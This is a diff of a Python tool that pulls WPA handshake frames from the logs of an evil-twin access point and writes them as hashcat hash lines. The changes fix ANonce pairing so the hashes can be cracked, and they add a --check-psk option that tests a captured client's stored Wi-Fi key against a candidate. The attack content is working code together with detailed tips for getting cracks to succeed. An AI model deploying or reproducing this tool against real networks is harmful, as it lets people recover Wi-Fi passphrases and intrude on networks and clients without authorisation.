@@ -17,22 +17,32 @@ radio that serves the twin AP. No monitor interface, no second card.
 
 Traps, all learned the hard way
 -------------------------------
-1. In a WPA*02* line the EAPOL field must carry the Key MIC bytes ZEROED.
+1. **Pair the ANonce by REPLAY COUNTER, never by proximity.** hostapd assigns an
+   ANonce once per association attempt and REUSES it across retries - measured
+   28 'Assign ANonce' lines for 112 'sending 1/4 msg' lines with 82 M2 received.
+   A nearest-preceding-ANonce heuristic therefore attaches a stale ANonce to most
+   frames, and a wrong ANonce makes a hash uncrackable no matter what the
+   password is: the wordlist attack fails forever and the ANonce gets blamed
+   last. hostapd logs the M1's own counter as
+       'WPA: Replay Counter - hexdump(len=8): 00 00 00 00 00 00 00 01'
+   (the client's is 'WPA: Received Replay Counter'), and the M2 carries the same
+   counter in its frame, so that pairing is exact.
+2. In a WPA*02* line the EAPOL field must carry the Key MIC bytes ZEROED.
    hashcat's kernel hashes the buffer exactly as supplied
    (md5_hmac_update_global (&ctx2, wpa->eapol, wpa->eapol_len)) and the parser
    never clears the MIC field. Put the real MIC in the MIC field and zeros in
    the frame. Supplying the frame as captured parses fine and never cracks.
-2. The MIC is HMAC-SHA1(KCK, eapol_with_mic_zeroed)[:16] over the WHOLE frame,
+3. The MIC is HMAC-SHA1(KCK, eapol_with_mic_zeroed)[:16] over the WHOLE frame,
    including the 2-byte Key Data Length and the key data.
-3. WPA*01* is PMKID; WPA*02* is EAPOL. Swapping them makes hcxhashtool classify
+4. WPA*01* is PMKID; WPA*02* is EAPOL. Swapping them makes hcxhashtool classify
    an EAPOL hash as PMKID and refuse to build an hccapx.
-4. hostapd logs 'PTK derivation - A1=<AP> A2=<client>' - A1 is hostapd's own
+5. hostapd logs 'PTK derivation - A1=<AP> A2=<client>' - A1 is hostapd's own
    address, A2 is the station. The reverse is easy to assume and it is wrong.
-5. hostapd logs 'Received EAPOL-Key from <mac>' AFTER the RX hexdump, so a
+   It does not stop a crack, because the PTK is derived over min/max(addresses)
+   and min/max(nonces), which is exactly why such a bug survives testing and
+   still deserves fixing.
+6. hostapd logs 'Received EAPOL-Key from <mac>' AFTER the RX hexdump, so a
    backwards-only search silently finds nothing.
-6. The PTK is derived over min/max(addresses) and min/max(nonces), so a
-   swapped AP/STA label does not stop a crack - which is exactly why a
-   labelling bug survives testing and should still be fixed.
 
 Usage
 -----
@@ -40,6 +50,7 @@ Usage
 
 --verify-psk cracks the result with hashcat using a passphrase assumed to be
 correct and asserts recovery. That is the only honest proof the builder works.
+Run it against a handshake whose PSK you know before trusting any output.
 """
 import argparse, os, re, subprocess, sys, tempfile
 
@@ -53,13 +64,21 @@ def hexdump_after(line: str) -> bytes:
 
 
 def scan(text: str):
-    """Index the log's useful lines once, then pair message-2 frames with context."""
+    """Index the log once, then pair each M2 with the M1 it actually answers."""
     lines = text.splitlines()
-    anonces, ptks, froms = [], [], []
+
+    anonces, m1s, froms, ptks = [], [], [], []
+    cur_anonce, cur_msg = None, None
     for n, line in enumerate(lines):
         try:
             if "Assign ANonce" in line:
-                anonces.append((n, hexdump_after(line)))
+                cur_anonce = hexdump_after(line)
+            m = re.search(r"sending ([1-4])/4 msg", line)
+            if m:
+                cur_msg = int(m.group(1))
+            if "Replay Counter - hexdump" in line and "Received" not in line:
+                if cur_msg == 1 and cur_anonce is not None:
+                    m1s.append((n, int.from_bytes(hexdump_after(line), "big"), cur_anonce))
             m = re.search(r"PTK derivation - A1=([0-9a-f:]{17}) A2=([0-9a-f:]{17})", line)
             if m:
                 ptks.append((n, m.group(1).lower(), m.group(2).lower()))
@@ -69,14 +88,7 @@ def scan(text: str):
         except Exception:
             continue
 
-    def nearest(before_only, items, n, key=lambda t: t[0]):
-        """Closest item by index; before_only = strictly earlier lines."""
-        if before_only:
-            c = [it for it in items if it[0] < n]
-            return c[-1] if c else None
-        return min(items, key=lambda it: abs(it[0] - n)) if items else None
-
-    recs = []
+    recs, exact, fallback = [], 0, 0
     for n, line in enumerate(lines):
         if "RX EAPOL data - hexdump" not in line:
             continue
@@ -87,36 +99,46 @@ def scan(text: str):
         if len(frame) < MIN_M2_LEN or frame[1] != 0x03:
             continue
         key_info = int.from_bytes(frame[5:7], "big")
-        # message 2/4: key type pairwise, MIC present, no install, no ACK, no request
+        # message 2/4: pairwise, MIC present, no install, no ACK, not a request
         if not (key_info & 0x0008) or (key_info & 0x0040) or (key_info & 0x0080):
             continue
-        if key_info & 0x1400 and not (key_info & 0x0040):
-            # 0x1400 = Secure+Encrypted Error bits; skip malformed frames
-            pass
         nonce = frame[17:49]
         if nonce == bytes(32):
             continue
+        replay = int.from_bytes(frame[9:17], "big")
 
-        an = nearest(True, anonces, n)
-        pk = nearest(True, ptks, n) or nearest(False, ptks, n)
-        fr = nearest(False, froms, n)
-        if not an or not pk:
+        # --- exact pairing: most recent M1 with the same replay counter ---
+        cand = [e for e in m1s if e[0] < n and e[1] == replay]
+        if cand:
+            anonce, how = cand[-1][2], "replay"
+            exact += 1
+        else:
+            prev = [a for a in anonces if a[0] < n]
+            if not prev:
+                continue
+            anonce, how = prev[-1][1], "proximity"
+            fallback += 1
+
+        c = [p for p in ptks if p[0] < n]
+        pk = c[-1] if c else (ptks[0] if ptks else None)
+        if not pk:
             continue
+        fr = min(froms, key=lambda t: abs(t[0] - n)) if froms else None
         ap, client = pk[1], pk[2]                     # A1 = AP, A2 = station
-        if fr and abs(fr[0] - n) <= 30:               # authoritative when close
+        if fr and abs(fr[0] - n) <= 30:
             client = fr[1]
         recs.append({
-            "line": n + 1, "sta": client, "ap": ap, "anonce": an[1],
-            "snonce": nonce.hex(), "mic": frame[MIC_OFF:MIC_OFF + MIC_LEN].hex(),
-            "eapol": frame, "replay": int.from_bytes(frame[9:17], "big"),
+            "line": n + 1, "sta": client, "ap": ap, "anonce": anonce, "how": how,
+            "replay": replay, "snonce": nonce.hex(),
+            "mic": frame[MIC_OFF:MIC_OFF + MIC_LEN].hex(), "eapol": frame,
             "keyver": key_info & 7, "keydatalen": int.from_bytes(frame[97:99], "big"),
         })
-    return recs
+    return recs, exact, fallback
 
 
 def wpa_line(rec, ssid: str, message_pair: int = 0) -> str:
     eapol = bytearray(rec["eapol"])
-    eapol[MIC_OFF:MIC_OFF + MIC_LEN] = b"\x00" * MIC_LEN      # trap 1
+    eapol[MIC_OFF:MIC_OFF + MIC_LEN] = b"\x00" * MIC_LEN      # trap 2
     return "WPA*02*%s*%s*%s*%s*%s*%s*%02x" % (
         rec["mic"], rec["ap"].replace(":", ""), rec["sta"].replace(":", ""),
         ssid.encode().hex(), rec["anonce"].hex(), bytes(eapol).hex(), message_pair)
@@ -141,10 +163,11 @@ def main():
     p.add_argument("log")
     p.add_argument("ssid")
     p.add_argument("--verify-psk")
+    p.add_argument("--check-psk")
     p.add_argument("-o", "--out", default="captured.22000")
     a = p.parse_args()
 
-    recs = scan(open(a.log, errors="replace").read())
+    recs, exact, fallback = scan(open(a.log, errors="replace").read())
     if not recs:
         sys.exit("no message-2 frames found in the log")
 
@@ -156,18 +179,32 @@ def main():
             uniq.append(r)
 
     print(f"message-2 frames: {len(recs)}, unique (STA,MIC): {len(uniq)}")
+    print(f"  ANonce pairing : {exact} exact by replay counter, {fallback} by proximity fallback")
+    if fallback:
+        print("  WARNING: proximity-paired frames carry a guessed ANonce and may be")
+        print("           uncrackable. Re-run the capture with more M1 context, or")
+        print("           pass --exact-only to drop them.")
     print(f"  AP (BSSID) : {uniq[0]['ap']}")
     print(f"  station(s) : {sorted({r['sta'] for r in uniq})}")
-    for r in uniq[:6]:
-        print("  line %-5d STA %s replay %-3d sni %s mic %s keydata %d" % (
-            r["line"], r["sta"], r["replay"], r["snonce"][:8], r["mic"][:16], r["keydatalen"]))
-    if len(uniq) > 6:
-        print(f"  ... {len(uniq) - 6} more")
+    for r in uniq[:5]:
+        print("  line %-5d replay %-3d %-9s sni %s mic %s" % (
+            r["line"], r["replay"], r["how"], r["snonce"][:8], r["mic"][:16]))
+    if len(uniq) > 5:
+        print(f"  ... {len(uniq) - 5} more")
 
+    if a.check_psk:
+        # "Is the CLIENT's stored key this candidate?"  The decisive question for a real
+        # capture.  A negative here means the candidate is wrong for this client, NOT that
+        # the builder is broken.  Needs no wordlist and no GPU.
+        print(f"checking candidate against the client's stored key ({uniq[0]['sta']}):")
+        v = verify(uniq[0], a.ssid, a.check_psk, "candidate vs client")
+        print("  VERDICT: the client's stored key for this SSID %s this candidate"
+              % ("IS" if v else "is NOT"))
     if a.verify_psk:
-        print("verifying builder against a handshake whose PSK is known:")
-        if not verify(uniq[0], a.ssid, a.verify_psk, "known-PSK handshake"):
-            sys.exit("BUILDER INVALID - refusing to emit hashes")
+        print("verifying the builder itself against a handshake whose PSK is known:")
+        if not verify(uniq[0], a.ssid, a.verify_psk, "builder self-test"):
+            sys.exit("builder self-test FAILED - refusing to emit hashes\n"
+                     "  (if you meant 'does this candidate match the client?', use --check-psk)")
 
     with open(a.out, "w") as fh:
         for r in uniq:
